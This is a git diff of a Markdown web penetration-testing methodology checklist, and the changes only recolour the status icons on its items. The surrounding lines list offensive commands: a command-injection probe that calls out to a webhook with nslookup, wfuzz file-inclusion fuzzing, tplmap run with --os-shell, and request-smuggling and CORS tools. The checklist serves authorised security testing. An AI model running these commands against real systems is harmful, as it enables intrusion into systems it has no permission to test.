@@ -1,7 +1,7 @@
 # Methodology
 
 ## Proxies
-- 🔵 __Abusing hop-by-hop headers__
+- 🟡 __Abusing hop-by-hop headers__
 ```bash
 // Tool hbh-header-abuse-test
 for HEADER in $(cat /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers); do python3 hbh-header-abuse-test.py -u <url> -x "$HEADER" -v; :'sleep 1'; done
@@ -28,8 +28,8 @@ python3 smuggler.py -u <url> -v 3
 // Tool h2csmuggler
 python3 h2csmuggler.py -x <url> -t --threads 5 -v
 ```
-- 🔴 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Active Scanner)
-- 🔵 __Uncovering Cloudflare__
+- 🟡 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Active Scanner)
+- 🔴 __Uncovering Cloudflare__
 - 🔴 __XSLT Server Side Injection__
 
 ## User input
@@ -49,7 +49,7 @@ original_cmd_by_server||sleep+5
 // Test when no effect on the application's response
 original_cmd_by_server;nslookup+<webhook>
 ```
-- 🔴 __CRLF__
+- 🟠 __CRLF__
 ```
 // Tool crlfuzz
 crlfuzz -u <url>
@@ -63,9 +63,9 @@ wfuzz -c -w /usr/share/wfuzz/wordlist/Injections/Traversal.txt --hw 0 http://10.
 wfuzz -X GET -c -w file_inclusion_linux.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
 wfuzz -X POST -c -w file_inclusion_linux.txt --hw 0 -d "foo=FUZZ" http://10.10.10.10/nav.php
 ```
-- 🔴 __Open Redirect__ (Detected by 👉 Burp Active Scanner)
+- 🟠 __Open Redirect__ (Detected by 👉 Burp Active Scanner)
 - 🔴 __Prototype Pollution to XSS__ (NodeJS)
-- 🔴 __Server Side Inclusion/Edge Side Inclusion__ (Detected by 👉 Burp Active Scanner)
+- 🟡 __Server Side Inclusion/Edge Side Inclusion__ (🔼 previous step)
 - 🔴 __Server Side Request Forgery__
 ```
 // Tool See-SURF (Test vulnerable parameter)
@@ -82,7 +82,7 @@ https://github.com/tarunkant/Gopherus
 // Tool tplmap
 python2 tplmap.py -u 'http://10.10.10.10/page?name=Box*' --os-shell
 ```
-- 🔴 __Reverse Tab Nabbing__ (Detected by 👉 Burp Extension - Discover Reverse Tabnabbing)
+- 🟠 __Reverse Tab Nabbing__ (Detected by 👉 Burp Extension - Discover Reverse Tabnabbing)
 - 🔴 __XSLT Server Side Injection__ (🔼 previous step)
 - 🔴 __XSS__ (Detected by 👉 Burp Active Scanner)
 ```
@@ -110,7 +110,7 @@ python3 nosql-login-bypass.py -t <TARGET> -u <USERNAME> -p <PASSWORD>
 // Fuzzing
 https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt
 ```
-- 🟠 __ReDoS__
+- 🔴 __ReDoS__
 ```
 Regular Expression Denial of Service
 // Tools
@@ -142,23 +142,23 @@ python3 STEWS-vuln-detect.py -u <URL> -1
 - 🔴 PostMessage Vulnerabilities
 
 ### HTTP Headers
-- 🔵 Clickjacking (Detected by 👉 Burp Scanner)
+- 🟡 Clickjacking (Detected by 👉 Burp Scanner)
 ```
 OR can use tool Clickjacking checker online
 ```
-- 🔴 Content Security Policy bypass
+- 🟢 Content Security Policy bypass
 ```
 // Checking CSP Policies Online
 https://csp-evaluator.withgoogle.com/
 https://cspvalidator.org/
 ```
-- 🔴 Cookies Hacking (Detected by 👉 Burp Scanner)
+- 🟢 Cookies Hacking (Detected by 👉 Burp Scanner)
 ```
 HttpOnly
 TRACE HEADER
 nmap --script http-trace -d <ip>
 ```
-- 🔴 CORS - Misconfigurations & Bypass (Detected by 👉 Burp Scanner)
+- 🟠 CORS - Misconfigurations & Bypass (Detected by 👉 Burp Scanner)
 ```
 // Tool Corsy
 python3 corsy.py -u <URL> -t 20 --header "Cookie: session=___"
